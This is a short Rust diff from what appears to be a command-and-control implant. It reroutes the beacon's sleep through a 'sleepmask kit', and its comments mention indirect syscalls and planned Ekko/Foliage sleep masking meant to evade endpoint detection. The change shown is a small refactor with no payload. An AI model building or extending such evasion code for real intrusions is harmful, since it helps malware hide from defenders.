@@ -41,8 +41,8 @@
 /// the beacon loop can switch `sleep_seconds(...)` to `sleep::sleep(...)`
 /// behind a config flag without a refactor when the full implementation lands.
 pub fn sleep(seconds: u32) {
-    // Delegate to the existing beacon sleep (indirect NtDelayExecution with the
-    // resolved-export fallback). Until the Ekko/Foliage chain is built and
-    // runtime-tested, this is correct (just not yet masked).
-    crate::beacon::sleep_seconds(seconds);
+    // Route through the sleepmask kit (crate::kits). The default kit (NoMask)
+    // delegates to the indirect-syscall sleep, so this is byte-identical to the
+    // pre-kit behavior; an Ekko/Foliage impl swaps in at the kit, not here.
+    crate::kits::sleep(seconds);
 }
